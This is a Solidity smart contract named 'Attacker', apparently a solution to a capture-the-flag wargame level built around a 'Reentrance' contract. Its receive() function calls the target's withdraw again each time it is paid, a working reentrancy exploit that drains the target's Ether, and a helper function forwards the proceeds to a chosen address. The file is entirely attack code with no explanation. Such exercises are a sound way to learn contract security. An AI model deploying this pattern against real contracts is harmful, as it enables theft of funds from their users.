// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "src/level10.sol";

contract Attacker
{
    Reentrance level10;

    constructor(address payable _level10) public payable
    {
        level10 = Reentrance(_level10);
    }

    function donate(address _to) external payable {
        level10.donate{value: 1 finney}(_to);
    }

    function withdraw() external{
        level10.withdraw(1 finney);
    }

    function getBalance(address _who) external view returns (uint){
        return address(_who).balance;
    }

    function fundmeback(address payable _to) external payable{
        require(_to.send(address(this).balance), "could not send Ether");
    }

    receive() external payable {
        level10.withdraw(1 finney);
    }
}